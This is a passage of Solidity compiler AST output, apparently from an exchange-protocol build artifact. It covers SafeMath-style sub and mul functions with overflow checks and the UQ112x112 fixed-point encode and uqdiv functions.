																"typeIdentifier": "t_stringliteral_03b20b9f6e6e7905f077509fd420fb44afc685f254bcefe49147296e1ba25590",
																"typeString": "literal_string \"ds-math-sub-underflow\""
															}
														],
														"id": 2344,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2446,
															2447
														],
														"referencedDeclaration": 2447,
														"src": "418:7:8",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 2354,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "418:50:8",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 2355,
												"nodeType": "ExpressionStatement",
												"src": "418:50:8"
											}
										]
									},
									"documentation": null,
									"id": 2357,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "sub",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2340,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2337,
												"name": "x",
												"nodeType": "VariableDeclaration",
												"scope": 2357,
												"src": "352:9:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2336,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "352:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2339,
												"name": "y",
												"nodeType": "VariableDeclaration",
												"scope": 2357,
												"src": "363:9:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2338,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "363:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "351:22:8"
									},
									"returnParameters": {
										"id": 2343,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2342,
												"name": "z",
												"nodeType": "VariableDeclaration",
												"scope": 2357,
												"src": "397:9:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2341,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "397:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "396:11:8"
									},
									"scope": 2386,
									"src": "339:136:8",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 2384,
										"nodeType": "Block",
										"src": "550:80:8",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"id": 2380,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 2369,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 2367,
																	"name": "y",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2361,
																	"src": "568:1:8",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "==",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 2368,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "573:1:8",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "568:6:8",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "||",
															"rightExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 2379,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 2377,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"id": 2374,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftHandSide": {
																					"argumentTypes": null,
																					"id": 2370,
																					"name": "z",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 2364,
																					"src": "579:1:8",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "Assignment",
																				"operator": "=",
																				"rightHandSide": {
																					"argumentTypes": null,
																					"commonType": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					},
																					"id": 2373,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftExpression": {
																						"argumentTypes": null,
																						"id": 2371,
																						"name": "x",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 2359,
																						"src": "583:1:8",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"nodeType": "BinaryOperation",
																					"operator": "*",
																					"rightExpression": {
																						"argumentTypes": null,
																						"id": 2372,
																						"name": "y",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 2361,
																						"src": "587:1:8",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"src": "583:5:8",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"src": "579:9:8",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			}
																		],
																		"id": 2375,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "578:11:8",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "/",
																	"rightExpression": {
																		"argumentTypes": null,
																		"id": 2376,
																		"name": "y",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 2361,
																		"src": "592:1:8",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"src": "578:15:8",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "==",
																"rightExpression": {
																	"argumentTypes": null,
																	"id": 2378,
																	"name": "x",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2359,
																	"src": "597:1:8",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "578:20:8",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"src": "568:30:8",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "64732d6d6174682d6d756c2d6f766572666c6f77",
															"id": 2381,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "600:22:8",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_25a0ef6406c6af6852555433653ce478274cd9f03a5dec44d001868a76b3bfdd",
																"typeString": "literal_string \"ds-math-mul-overflow\""
															},
															"value": "ds-math-mul-overflow"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_25a0ef6406c6af6852555433653ce478274cd9f03a5dec44d001868a76b3bfdd",
																"typeString": "literal_string \"ds-math-mul-overflow\""
															}
														],
														"id": 2366,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2446,
															2447
														],
														"referencedDeclaration": 2447,
														"src": "560:7:8",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 2382,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "560:63:8",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 2383,
												"nodeType": "ExpressionStatement",
												"src": "560:63:8"
											}
										]
									},
									"documentation": null,
									"id": 2385,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "mul",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2362,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2359,
												"name": "x",
												"nodeType": "VariableDeclaration",
												"scope": 2385,
												"src": "494:9:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2358,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "494:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2361,
												"name": "y",
												"nodeType": "VariableDeclaration",
												"scope": 2385,
												"src": "505:9:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2360,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "505:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "493:22:8"
									},
									"returnParameters": {
										"id": 2365,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2364,
												"name": "z",
												"nodeType": "VariableDeclaration",
												"scope": 2385,
												"src": "539:9:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2363,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "539:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "538:11:8"
									},
									"scope": 2386,
									"src": "481:149:8",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "internal"
								}
							],
							"scope": 2387,
							"src": "175:457:8"
						}
					],
					"src": "36:597:8"
				},
				"id": 8
			},
			"src/exchange-protocol/contracts/libraries/UQ112x112.sol": {
				"ast": {
					"absolutePath": "src/exchange-protocol/contracts/libraries/UQ112x112.sol",
					"exportedSymbols": {
						"UQ112x112": [
							2428
						]
					},
					"id": 2429,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 2388,
							"literals": [
								"solidity",
								"=",
								"0.5",
								".16"
							],
							"nodeType": "PragmaDirective",
							"src": "36:24:9"
						},
						{
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "library",
							"documentation": null,
							"fullyImplemented": true,
							"id": 2428,
							"linearizedBaseContracts": [
								2428
							],
							"name": "UQ112x112",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": true,
									"id": 2393,
									"name": "Q112",
									"nodeType": "VariableDeclaration",
									"scope": 2428,
									"src": "243:30:9",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint224",
										"typeString": "uint224"
									},
									"typeName": {
										"id": 2389,
										"name": "uint224",
										"nodeType": "ElementaryTypeName",
										"src": "243:7:9",
										"typeDescriptions": {
											"typeIdentifier": "t_uint224",
											"typeString": "uint224"
										}
									},
									"value": {
										"argumentTypes": null,
										"commonType": {
											"typeIdentifier": "t_rational_5192296858534827628530496329220096_by_1",
											"typeString": "int_const 5192...(26 digits omitted)...0096"
										},
										"id": 2392,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"lValueRequested": false,
										"leftExpression": {
											"argumentTypes": null,
											"hexValue": "32",
											"id": 2390,
											"isConstant": false,
											"isLValue": false,
											"isPure": true,
											"kind": "number",
											"lValueRequested": false,
											"nodeType": "Literal",
											"src": "267:1:9",
											"subdenomination": null,
											"typeDescriptions": {
												"typeIdentifier": "t_rational_2_by_1",
												"typeString": "int_const 2"
											},
											"value": "2"
										},
										"nodeType": "BinaryOperation",
										"operator": "**",
										"rightExpression": {
											"argumentTypes": null,
											"hexValue": "313132",
											"id": 2391,
											"isConstant": false,
											"isLValue": false,
											"isPure": true,
											"kind": "number",
											"lValueRequested": false,
											"nodeType": "Literal",
											"src": "270:3:9",
											"subdenomination": null,
											"typeDescriptions": {
												"typeIdentifier": "t_rational_112_by_1",
												"typeString": "int_const 112"
											},
											"value": "112"
										},
										"src": "267:6:9",
										"typeDescriptions": {
											"typeIdentifier": "t_rational_5192296858534827628530496329220096_by_1",
											"typeString": "int_const 5192...(26 digits omitted)...0096"
										}
									},
									"visibility": "internal"
								},
								{
									"body": {
										"id": 2408,
										"nodeType": "Block",
										"src": "380:57:9",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 2406,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 2400,
														"name": "z",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 2398,
														"src": "390:1:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint224",
															"typeString": "uint224"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint224",
															"typeString": "uint224"
														},
														"id": 2405,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 2402,
																	"name": "y",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2395,
																	"src": "402:1:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																],
																"id": 2401,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "394:7:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_uint224_$",
																	"typeString": "type(uint224)"
																},
																"typeName": "uint224"
															},
															"id": 2403,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "394:10:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint224",
																"typeString": "uint224"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "*",
														"rightExpression": {
															"argumentTypes": null,
															"id": 2404,
															"name": "Q112",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 2393,
															"src": "407:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint224",
																"typeString": "uint224"
															}
														},
														"src": "394:17:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint224",
															"typeString": "uint224"
														}
													},
													"src": "390:21:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint224",
														"typeString": "uint224"
													}
												},
												"id": 2407,
												"nodeType": "ExpressionStatement",
												"src": "390:21:9"
											}
										]
									},
									"documentation": null,
									"id": 2409,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "encode",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2396,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2395,
												"name": "y",
												"nodeType": "VariableDeclaration",
												"scope": 2409,
												"src": "335:9:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 2394,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "335:7:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "334:11:9"
									},
									"returnParameters": {
										"id": 2399,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2398,
												"name": "z",
												"nodeType": "VariableDeclaration",
												"scope": 2409,
												"src": "369:9:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint224",
													"typeString": "uint224"
												},
												"typeName": {
													"id": 2397,
													"name": "uint224",
													"nodeType": "ElementaryTypeName",
													"src": "369:7:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint224",
														"typeString": "uint224"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "368:11:9"
									},
									"scope": 2428,
									"src": "319:118:9",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 2426,
										"nodeType": "Block",
										"src": "576:35:9",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 2424,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 2418,
														"name": "z",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 2416,
														"src": "586:1:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint224",
															"typeString": "uint224"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint224",
															"typeString": "uint224"
														},
														"id": 2423,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 2419,
															"name": "x",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 2411,
															"src": "590:1:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint224",
																"typeString": "uint224"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "/",
														"rightExpression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 2421,
																	"name": "y",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2413,
																	"src": "602:1:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																],
																"id": 2420,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "594:7:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_uint224_$",
																	"typeString": "type(uint224)"
																},
																"typeName": "uint224"
															},
															"id": 2422,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "594:10:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint224",
																"typeString": "uint224"
															}
														},
														"src": "590:14:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint224",
															"typeString": "uint224"
														}
													},
													"src": "586:18:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint224",
														"typeString": "uint224"
													}
												},
												"id": 2425,
												"nodeType": "ExpressionStatement",
												"src": "586:18:9"
											}
										]
									},
									"documentation": null,
									"id": 2427,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "uqdiv",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2414,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2411,
												"name": "x",
												"nodeType": "VariableDeclaration",
												"scope": 2427,
												"src": "520:9:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint224",
													"typeString": "uint224"
												},
												"typeName": {
													"id": 2410,
													"name": "uint224",
													"nodeType": "ElementaryTypeName",
													"src": "520:7:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint224",
														"typeString": "uint224"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2413,
												"name": "y",
												"nodeType": "VariableDeclaration",
												"scope": 2427,
												"src": "531:9:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 2412,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "531:7:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "519:22:9"
									},
									"returnParameters": {
										"id": 2417,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2416,
												"name": "z",
												"nodeType": "VariableDeclaration",
												"scope": 2427,
												"src": "565:9:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint224",
													"typeString": "uint224"
												},
												"typeName": {
													"id": 2415,
													"name": "uint224",
													"nodeType": "ElementaryTypeName",
													"src": "565:7:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint224",
														"typeString": "uint224"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "564:11:9"
									},
									"scope": 2428,
									"src": "505:106:9",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "internal"
								}
							],
							"scope": 2429,
							"src": "219:394:9"
						}
					],
					"src": "36:578:9"
				},
				"id": 9
			}
		}
	}
}